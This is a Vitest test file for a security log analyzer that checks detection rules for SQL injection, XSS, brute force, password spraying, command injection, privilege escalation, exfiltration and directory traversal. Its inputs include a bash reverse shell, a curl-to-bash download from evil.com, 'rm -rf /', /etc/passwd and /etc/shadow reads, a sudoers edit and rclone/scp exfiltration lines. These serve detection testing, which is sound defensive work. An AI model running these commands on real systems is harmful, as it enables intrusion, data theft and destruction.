import { describe, it, expect } from "vitest";
import type { RuleContext } from "@/analysis/types";
import { checkSqlInjection } from "../rules/sql-injection";
import { checkXss } from "../rules/xss";
import { checkBruteForce } from "../rules/brute-force";
import { checkCommandInjection } from "../rules/command-injection";
import { checkPrivilegeEscalation } from "../rules/privilege-escalation";
import { checkDataExfiltration } from "../rules/data-exfiltration";
import { checkDirectoryTraversal } from "../rules/directory-traversal";

/** Create a fresh RuleContext for each test */
function makeContext(): RuleContext {
  return {
    ipCounters: new Map(),
    ipRequestTimes: new Map(),
    ipDistinctUsers: new Map(),
    ipRequestStats: new Map(),
    totalLines: 100,
    lineIndex: 0,
  };
}

// ---- SQL Injection ----

describe("SQL Injection detection", () => {
  const ctx = makeContext();

  it("detects UNION SELECT", () => {
    const findings = checkSqlInjection(
      'GET /page?id=1 UNION SELECT username,password FROM users HTTP/1.1',
      1,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].category).toBe("SQL_INJECTION");
    expect(findings[0].severity).toBe("CRITICAL");
  });

  it("detects OR 1=1 tautology", () => {
    const findings = checkSqlInjection(
      "GET /api/users?id=1 OR 1=1-- HTTP/1.1",
      2,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings.some((f) => f.severity === "CRITICAL")).toBe(true);
  });

  it("detects time-based blind SQLi (SLEEP)", () => {
    const findings = checkSqlInjection(
      "GET /page?id=1; SELECT SLEEP(5) HTTP/1.1",
      3,
      ctx
    );
    expect(findings.some((f) => f.title.includes("SLEEP"))).toBe(true);
  });

  it("detects INFORMATION_SCHEMA enumeration", () => {
    const findings = checkSqlInjection(
      "GET /page?id=1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES",
      4,
      ctx
    );
    expect(findings.some((f) => f.title.includes("INFORMATION_SCHEMA"))).toBe(true);
  });

  it("does not false-positive on normal log line", () => {
    const findings = checkSqlInjection(
      '192.168.1.10 - - [23/Feb/2026:10:15:01 +0000] "GET /dashboard HTTP/1.1" 200 5432',
      5,
      ctx
    );
    expect(findings).toHaveLength(0);
  });

  it("returns correct MITRE mapping", () => {
    const findings = checkSqlInjection("GET /page?q=UNION SELECT 1", 6, ctx);
    expect(findings[0].mitreTactic).toBe("Initial Access");
    expect(findings[0].mitreTechnique).toContain("T1190");
  });
});

// ---- XSS ----

describe("XSS detection", () => {
  const ctx = makeContext();

  it("detects <script> tag injection", () => {
    const findings = checkXss(
      'GET /page?q=<script>alert(document.cookie)</script> HTTP/1.1',
      1,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].category).toBe("XSS");
  });

  it("detects onerror event handler", () => {
    const findings = checkXss(
      'GET /page?q=<img src=x onerror=alert(1)> HTTP/1.1',
      2,
      ctx
    );
    expect(findings.some((f) => f.title.includes("onerror"))).toBe(true);
  });

  it("detects javascript: URI", () => {
    const findings = checkXss("GET /redirect?url=javascript:alert(1)", 3, ctx);
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects document.cookie access", () => {
    const findings = checkXss(
      "GET /page?q=<script>document.cookie</script>",
      4,
      ctx
    );
    expect(findings.some((f) => f.title.includes("document.cookie"))).toBe(true);
  });

  it("does not false-positive on normal HTML in log", () => {
    const findings = checkXss(
      '192.168.1.10 - - [23/Feb/2026:10:15:01 +0000] "GET /index.html HTTP/1.1" 200 1234',
      5,
      ctx
    );
    expect(findings).toHaveLength(0);
  });
});

// ---- Brute Force ----

describe("Brute Force detection", () => {
  it("does not flag below threshold (9 attempts)", () => {
    const ctx = makeContext();
    let lastFindings;
    for (let i = 0; i < 9; i++) {
      lastFindings = checkBruteForce(
        `Failed password for root from 10.0.0.5 port 22 ssh2`,
        i + 1,
        ctx
      );
    }
    expect(lastFindings).toHaveLength(0);
  });

  it("flags at exactly threshold (10 attempts from same IP)", () => {
    const ctx = makeContext();
    let findings;
    for (let i = 0; i < 10; i++) {
      findings = checkBruteForce(
        `Failed password for root from 10.0.0.5 port 22 ssh2`,
        i + 1,
        ctx
      );
    }
    expect(findings!.length).toBe(1);
    expect(findings![0].category).toBe("BRUTE_FORCE");
    expect(findings![0].severity).toBe("HIGH");
  });

  it("escalates to CRITICAL at 5x threshold (50 attempts)", () => {
    const ctx = makeContext();
    let findings;
    for (let i = 0; i < 50; i++) {
      findings = checkBruteForce(
        `Failed password for root from 10.0.0.5 port 22 ssh2`,
        i + 1,
        ctx
      );
    }
    expect(findings!.length).toBe(1);
    expect(findings![0].severity).toBe("CRITICAL");
  });

  it("tracks separate IPs independently", () => {
    const ctx = makeContext();
    // 9 from IP A — should not trigger
    for (let i = 0; i < 9; i++) {
      checkBruteForce(`Failed password for root from 10.0.0.1 port 22`, i + 1, ctx);
    }
    // 9 from IP B — should not trigger
    for (let i = 0; i < 9; i++) {
      checkBruteForce(`Failed password for root from 10.0.0.2 port 22`, i + 10, ctx);
    }
    expect(ctx.ipCounters.get("10.0.0.1")).toBe(9);
    expect(ctx.ipCounters.get("10.0.0.2")).toBe(9);
  });

  it("requires IP to be present in line", () => {
    const ctx = makeContext();
    // Line matches auth failure pattern but has no IP
    const findings = checkBruteForce("Login failed: invalid credentials", 1, ctx);
    expect(findings).toHaveLength(0);
  });
});

// ---- Password Spray Detection ----

describe("Password Spray detection", () => {
  it("does not flag below spray threshold (4 distinct users)", () => {
    const ctx = makeContext();
    const users = ["admin", "root", "deploy", "postgres"];
    let lastFindings;
    for (let i = 0; i < users.length; i++) {
      lastFindings = checkBruteForce(
        `Failed password for ${users[i]} from 10.0.0.99 port 22 ssh2`,
        i + 1,
        ctx
      );
    }
    // No spray finding (below 5 distinct users)
    const sprayFindings = lastFindings!.filter((f) =>
      f.title.includes("Password Spray")
    );
    expect(sprayFindings).toHaveLength(0);
  });

  it("flags at exactly 5 distinct users from same IP", () => {
    const ctx = makeContext();
    const users = ["admin", "root", "deploy", "postgres", "ubuntu"];
    const allFindings: import("@/analysis/types").RawFinding[] = [];
    for (let i = 0; i < users.length; i++) {
      const findings = checkBruteForce(
        `Failed password for ${users[i]} from 10.0.0.99 port 22 ssh2`,
        i + 1,
        ctx
      );
      allFindings.push(...findings);
    }
    const sprayFindings = allFindings.filter((f) =>
      f.title.includes("Password Spray")
    );
    expect(sprayFindings).toHaveLength(1);
    expect(sprayFindings[0].severity).toBe("CRITICAL");
    expect(sprayFindings[0].mitreTechnique).toContain("T1110.003");
  });

  it("does not double-count the same username", () => {
    const ctx = makeContext();
    // Same user "root" repeated from same IP — only 1 distinct user
    for (let i = 0; i < 5; i++) {
      checkBruteForce(
        `Failed password for root from 10.0.0.99 port 22 ssh2`,
        i + 1,
        ctx
      );
    }
    expect(ctx.ipDistinctUsers.get("10.0.0.99")?.size).toBe(1);
  });

  it("tracks spray per-IP independently", () => {
    const ctx = makeContext();
    // 3 users from IP A
    for (const user of ["admin", "root", "deploy"]) {
      checkBruteForce(
        `Failed password for ${user} from 10.0.0.1 port 22 ssh2`,
        1,
        ctx
      );
    }
    // 3 users from IP B — neither should trigger spray
    for (const user of ["ubuntu", "postgres", "www-data"]) {
      checkBruteForce(
        `Failed password for ${user} from 10.0.0.2 port 22 ssh2`,
        1,
        ctx
      );
    }
    expect(ctx.ipDistinctUsers.get("10.0.0.1")?.size).toBe(3);
    expect(ctx.ipDistinctUsers.get("10.0.0.2")?.size).toBe(3);
  });
});

// ---- Command Injection ----

describe("Command Injection detection", () => {
  const ctx = makeContext();

  it("detects bash reverse shell", () => {
    const findings = checkCommandInjection(
      'POST /api/run HTTP/1.1 "bash -i >& /dev/tcp/10.10.10.10/4444"',
      1,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].category).toBe("COMMAND_INJECTION");
    expect(findings[0].severity).toBe("CRITICAL");
  });

  it("detects curl piped to shell", () => {
    const findings = checkCommandInjection(
      "cmd: curl http://evil.com/payload.sh | bash",
      2,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects rm -rf / destructive command", () => {
    const findings = checkCommandInjection(
      "exec: rm -rf /",
      3,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects backtick command substitution", () => {
    const findings = checkCommandInjection(
      "GET /page?q=`cat /etc/passwd` HTTP/1.1",
      4,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("does not false-positive on normal log line", () => {
    const findings = checkCommandInjection(
      '192.168.1.10 - - [23/Feb/2026:10:15:01 +0000] "GET /static/main.js HTTP/1.1" 200 125000',
      5,
      ctx
    );
    expect(findings).toHaveLength(0);
  });
});

// ---- Privilege Escalation ----

describe("Privilege Escalation detection", () => {
  const ctx = makeContext();

  it("detects sudo -i root shell", () => {
    const findings = checkPrivilegeEscalation(
      "sudo -i executed by user admin from tty pts/0",
      1,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].category).toBe("PRIVILEGE_ESCALATION");
  });

  it("detects sudoers file access", () => {
    const findings = checkPrivilegeEscalation(
      "Modified /etc/sudoers to add NOPASSWD for user attacker",
      2,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects Windows admin group modification", () => {
    const findings = checkPrivilegeEscalation(
      "net localgroup administrators hacker /add",
      3,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].severity).toBe("CRITICAL");
  });

  it("detects chmod setuid bit", () => {
    const findings = checkPrivilegeEscalation(
      "chmod 4755 /tmp/backdoor",
      4,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });
});

// ---- Data Exfiltration ----

describe("Data Exfiltration detection", () => {
  const ctx = makeContext();

  it("detects rclone data transfer", () => {
    const findings = checkDataExfiltration(
      "rclone sync /data remote:exfil-bucket",
      1,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].category).toBe("DATA_EXFILTRATION");
    expect(findings[0].severity).toBe("CRITICAL");
  });

  it("detects archive of sensitive directories", () => {
    const findings = checkDataExfiltration(
      "tar czf /tmp/dump.tar.gz /etc /root/.ssh /home",
      2,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects SCP file transfer to external IP", () => {
    const findings = checkDataExfiltration(
      "scp /tmp/dump.tar.gz user@203.0.113.50:/drops/",
      3,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects large outbound data transfer", () => {
    const findings = checkDataExfiltration(
      "bytes_out=150000000 dst=203.0.113.100",
      4,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });
});

// ---- Directory Traversal ----

describe("Directory Traversal detection", () => {
  const ctx = makeContext();

  it("detects /etc/passwd access", () => {
    const findings = checkDirectoryTraversal(
      "GET /../../etc/passwd HTTP/1.1",
      1,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].category).toBe("DIRECTORY_TRAVERSAL");
  });

  it("detects URL-encoded traversal", () => {
    const findings = checkDirectoryTraversal(
      "GET /%2e%2e%2f%2e%2e%2fetc/shadow HTTP/1.1",
      2,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
  });

  it("detects PHP filter wrapper", () => {
    const findings = checkDirectoryTraversal(
      "GET /page?file=php://filter/convert.base64-encode/resource=config.php",
      3,
      ctx
    );
    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].severity).toBe("CRITICAL");
  });
});
